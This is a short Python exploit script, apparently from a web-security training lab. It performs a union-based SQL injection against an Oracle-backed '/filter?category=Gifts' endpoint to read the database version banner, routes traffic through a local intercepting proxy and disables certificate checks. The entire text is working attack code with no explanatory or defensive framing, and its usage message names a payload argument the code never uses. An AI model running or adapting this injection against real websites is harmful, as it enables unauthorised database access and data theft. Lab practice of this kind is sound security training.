import sys
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies={'https':'http://127.0.0.1:8080','http':'http://127.0.0.1:8080'}

def exploit_sqli(url):
    uri = '/filter?category=Gifts'
    payload="'union select banner, null from v$version--"
    print(f"Sending request to {url + uri + payload}")
    try:
        r= requests.get(url + uri + payload,verify=False,proxies=proxies)
    except Exception as e:
        print(f"Error: {e}")
        return False
    if "Oracle Database" in r.text:
        return True

if __name__=="__main__":
    try:
        url = sys.argv[1].strip()
        
    except IndexError:
        print("[-] Usage: %s <url> <payload>" % sys.argv[0])
        print('[-] Example: %s www.example.com "1=1"' % sys.argv[0])
        sys.exit(-1)

    if exploit_sqli(url):
        print("[+] SQL injection successful!")
    else:
        print("[-] SQL injection unsuccessful!")